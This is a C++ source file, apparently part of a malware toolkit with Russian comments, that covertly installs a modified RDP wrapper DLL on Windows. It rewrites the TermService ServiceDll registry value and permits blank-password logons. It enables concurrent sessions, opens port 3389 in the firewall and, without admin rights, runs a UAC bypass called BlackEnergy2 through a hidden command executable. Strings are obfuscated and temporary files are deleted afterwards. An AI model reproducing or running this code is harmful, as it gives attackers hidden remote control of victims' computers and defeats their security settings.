#include "core\winapi.h"
#include "core\memory.h"
#include "core\string.h"
#include "core\debug.h"
#include "core\rand.h"
#include "core\reestr.h"
#include "core\path.h"
#include "core\file.h"
#include "core\process.h"
#include "core\service.h"
#include "core\misc.h"
#include "core\elevation.h"
//#include "dllmain.h"

#include "hidden_cmd.cpp"
#include "rdpwrap32.cpp"
#include "rdpwrap64.cpp"

struct ReestrKeyValue
{
	const char* key;
	const char* name;
	DWORD value;
};

const char* nodeTermServiceDll = _CT_("SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters");
const char* paramTermServiceDll = _CT_("ServiceDll");
const char* origNameTermServiceDll = _CT_("%SystemRoot%\\System32\\termsrv.dll");

ReestrKeyValue ReestrUpdate[] =
{
	{ _CT_("SYSTEM\\CurrentControlSet\\Control\\Terminal Server"), _CT_("fDenyTSConnections"), 0 },
//	{ _CT_("SYSTEM\\CurrentControlSet\\Control\\Terminal Server"), _CT_("fSingleSessionPerUser"), 0 },
//	{ _CT_("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp"), _CT_("UserAuthentication"), 0 },
	{ _CT_("SYSTEM\\CurrentControlSet\\Control\\Lsa"), _CT_("LimitBlankPasswordUse"), 0 },
	{ _CT_("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core"), _CT_("EnableConcurrentSessions"), 0 },
	{ _CT_("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"), _CT_("AllowMultipleTSSessions"), 1 },
	{ 0 }
};


static bool CreateNameRdpWrapDll( StringBuilder& path );
static bool FixedReestr( int uac, StringBuilder& cmds );
//возвращает 0, если чтения и записьв реестр возможна, 1 - для записи в реестр нужен обход уака, 2 - в реестр ничего нельзя записать
static int GetNameTermServiceDll( Reestr& r, StringBuilder& nameTermServiceDll );

bool RdpWrapInstall()
{
	DbgMsg( "Инсталируем rpdwrap.dll" );
	StringBuilder currNameTermServiceDll;
	StringBuilder cmd(512), cmds; //команды которые нужно выполнить после обхода уака
	Reestr r;
	int uac = GetNameTermServiceDll( r, currNameTermServiceDll );
	if( uac == 2 ) return false;
	currNameTermServiceDll.Lower();
	bool ret= false;

	//смотрим какой разрядность ОС и ставим соответствующую длл
	BOOL wow64;
	HANDLE hprocess = API(KERNEL32, GetCurrentProcess)();
	API(KERNEL32, IsWow64Process)( hprocess, &wow64 );
	byte* dll;
	int c_dll;
	if( wow64 )
	{
		dll = rdpwrap64;
		c_dll = sizeof(rdpwrap64);
	}
	else
	{
		dll = rdpwrap32;
		c_dll = sizeof(rdpwrap32);
	}

	if( currNameTermServiceDll.IndexOf( _CS_("termsrv.dll") ) > 0 ) //еще не ставили
	{
		StringBuilderStack<MAX_PATH> rdpWrapNameDll;
		if( CreateNameRdpWrapDll(rdpWrapNameDll) )
		{
			if( File::WriteAll( rdpWrapNameDll, dll, c_dll ) ) ret = true;
		}
		if( !ret ) //не удалось создать файл, создаем во временной папке
		{
			File::GetTempFile( rdpWrapNameDll.c_str() );
			rdpWrapNameDll.UpdateLen();
			if( !File::WriteAll( rdpWrapNameDll, dll, c_dll ) )
				return false;
			else
				ret = true;
		}
		DbgMsg( "Имя rdpwrap.dll %s", rdpWrapNameDll.c_str() );
		bool ok = false;
		if( uac == 0 )
			ok = r.SetString( DECODE_STRING(paramTermServiceDll), rdpWrapNameDll );
		else
		{
			cmd.Format( "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%s\" /f\r\n", rdpWrapNameDll );
			//ok = UAC::BlackEnergy2(cmd);
			cmds += cmd;
			ok = true;
		}
		if( !ok )
		{
			DbgMsg( "Не удалось прописать dll в реестре" );
			return false;
		}

		FixedReestr( uac, cmds );

		Service::Stop(_CS_("TermService"));
		Delay(1000); //ждем пока сервис отключится
		Process::KillLoadedModule( _CS_("termsrv.dll") ); //уничтожаем все процессы связанные с РДП на случай если не удалось остановить службу
	}
	else
	{
		DbgMsg( "rdwrap.dll уже была установлена" );
		ret = true;
	}
	if( uac == 0 )
	{
		Process::Exec( Process::EXEC_NOWINDOW, 0, _CS_("netsh advfirewall firewall del rule name=\"Remote Desktop\"") );
		Process::Exec( Process::EXEC_NOWINDOW, 0, _CS_("netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in protocol=tcp localport=3389 profile=any action=allow") );
	}
	else
	{
		cmds += _CS_("netsh advfirewall firewall del rule name=\"Remote Desktop\"\r\n");
		cmds += _CS_("netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in protocol=tcp localport=3389 profile=any action=allow\r\n");
	}

	if( uac )
	{
		cmds += _CS_("sc config TermService start= auto\r\n");
		cmds += _CS_("sc start TermService\r\n");
//		cmds += _CS_("net start TermService\r\n");
		StringBuilderStack<MAX_PATH> cmdFile, hiddenCmdFile;
		File::GetTempFile(cmdFile);
		cmdFile.UpdateLen();
		Path::ChangeExt( cmdFile, _CS_("cmd") );
		File::Write( cmdFile, cmds );
		File::GetTempFile(hiddenCmdFile);
		hiddenCmdFile.UpdateLen();
		Path::ChangeExt( hiddenCmdFile, _CS_("exe") );
		File::WriteAll( hiddenCmdFile, hidden_cmd, sizeof(hidden_cmd) );
		cmd.Format( _CS_("%s 1 \"%s\""), hiddenCmdFile.c_str(), cmdFile.c_str() );
		if( !Elevation::BlackEnergy2( cmd, true ) )
		{
			ret = false;
		}
		else
			Delay(10000); //ждем когда командный файл довыполняется и запустится служба
		File::Delete(cmdFile);
		File::Delete(hiddenCmdFile);
	}
	else
	{
		Service::SetStartType( _CS_("TermService"), SERVICE_AUTO_START );
		Service::Start(_CS_("TermService"));
	}
	return ret;
}

bool RdpWrapUninstall()
{
	DbgMsg( "Деинсталируем rdpwrap.dll" );
	StringBuilder currNameTermServiceDll;
	Reestr r;
	if( !GetNameTermServiceDll( r, currNameTermServiceDll ) ) return false;
	currNameTermServiceDll.Lower();
	bool ret= false;
	if( currNameTermServiceDll.IndexOf( _CS_("termsrv.dll") ) > 0 ) //ничего не ставили
	{
		DbgMsg( "rdpwrap.dll не была установлена" );
		return true;
	}
	Service::Stop(_CS_("TermService"));
	Delay(1000); //ждем пока сервис отключится
	DbgMsg( "Удаляем %s", currNameTermServiceDll.c_str() );
	if( !File::DeleteHard(currNameTermServiceDll) ) //если не удалось удалить, то удалится после ребута
	{
		DbgMsg( "Не удаось удалить %s, удаляем после ребута", currNameTermServiceDll.c_str() );
		API(KERNEL32, MoveFileExA)( currNameTermServiceDll, 0, MOVEFILE_DELAY_UNTIL_REBOOT );
	}
	r.SetString( DECODE_STRING(paramTermServiceDll), DECODE_STRING(origNameTermServiceDll) );
	return true;
}

int GetNameTermServiceDll( Reestr& r, StringBuilder& nameTermServiceDll )
{
	int ret = 0;
	r.Open( HKEY_LOCAL_MACHINE, DECODE_STRING(nodeTermServiceDll) );
	if( !r.Valid() ) //если не получили значение реестра, значит UAC не пустил, в этом случае читаем с правами только для чтения и возвращаем 1 как признак, того что нужно обходить UAC
	{
		DbgMsg( "Нужен обход уака" );
		r.Open( HKEY_LOCAL_MACHINE, DECODE_STRING(nodeTermServiceDll), KEY_READ );
		ret = 1;
	}
	if( !r.Valid() )
	{
		ret = 2;
	}
	else
	{
		r.GetString( DECODE_STRING(paramTermServiceDll), nameTermServiceDll );
	}
	return ret;
}

struct InfoDirs
{
	int n; //номер какой папки взять, если -1, то считать количество папок
	int count; //количество найденных папок
	StringBuilder name; //имя папки
};

static bool ListFilesCallback( File::FileInfo& fi, void* tag )
{
	InfoDirs* info = (InfoDirs*)tag;
	bool ret = true;
	if( (fi.fd.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) == 0 )
	{
		if( info->n < 0 )
		{
			info->count++;
		}
		else if( info->n == 0 )
		{
			info->name = fi.fd.cFileName;
			ret = false; //закончили
		}
		else
			info->n--;
	}
	return ret;
}

bool CreateNameRdpWrapDll( StringBuilder& path )
{
	StringBuilderStack<64> nameDll;
	Rand::Gen( nameDll, 8 );
	Path::GetCSIDLPath( CSIDL_COMMON_APPDATA, path );
	InfoDirs info;
	info.count = 0;
	info.n = -1;
	File::ListFiles( path, _CS_("*.*"), ListFilesCallback, 4, &info );
	bool ret = false;
	if( info.count > 0 )
	{
		int n = Rand::Gen(info.count - 1);
		StringBuilder testFile;
		for( int i = 0; i < info.count; i++ )
		{
			info.n = n;
			File::ListFiles( path, _CS_("*.*"), ListFilesCallback, 4, &info );
			Path::Combine( testFile, path, info.name, _CS_("test.txt" ) );
			if( File::Write( testFile, nameDll ) )
			{
				File::Delete(testFile);
				ret = true;
				break;
			}
			n++;
			if( n >= info.count ) n = 0;
		}
	}
	if( !ret )
	{
		Rand::Gen( info.name, 8 );
		StringBuilder folder;
		Path::Combine( folder, path, info.name );
		if( !Path::CreateDirectory(folder) ) ret = false;
	}
	if( ret )
	{
		Path::AppendFile( path, info.name );
		nameDll += _CS_(".dll");
		Path::AppendFile( path, nameDll );
	}
	return ret;
}

bool FixedReestr( int uac, StringBuilder& cmds )
{
	ReestrKeyValue* rkv = ReestrUpdate;
	StringBuilder cmd(512);
	while( rkv->key )
	{
		if( uac == 0 )
		{
			Reestr r;
			if( r.Create( HKEY_LOCAL_MACHINE, DECODE_STRING(rkv->key) ) )
				r.SetDWORD( DECODE_STRING(rkv->name), rkv->value );
		}
		else
		{
			cmd.Format( "reg add \"HKLM\\%s\" /v %s /t REG_DWORD /d %d /f\r\n", DECODE_STRING(rkv->key), DECODE_STRING(rkv->name), rkv->value );
			cmds += cmd;
		}
		rkv++;
	}
	return true;
}
